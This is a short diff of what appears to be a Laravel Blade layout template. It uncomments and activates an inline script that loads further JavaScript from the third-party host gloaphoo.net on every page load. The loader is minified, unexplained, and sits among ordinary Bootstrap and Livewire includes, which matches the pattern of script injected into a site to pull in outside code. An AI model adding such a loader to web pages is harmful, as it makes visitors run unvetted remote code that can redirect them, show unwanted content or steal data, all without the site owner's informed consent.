@@ -72,9 +72,9 @@
    
     <script src="{{URL::to('bst/js/popper.js')}}"></script>
     <script src="{{URL::to('bst/js/bootstrap.js')}}"></script>
-    {{--
+   
     <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gloaphoo.net',5596069,document.createElement('script'))</script>
-    --}}
+
     @livewireScripts
    
 </body>
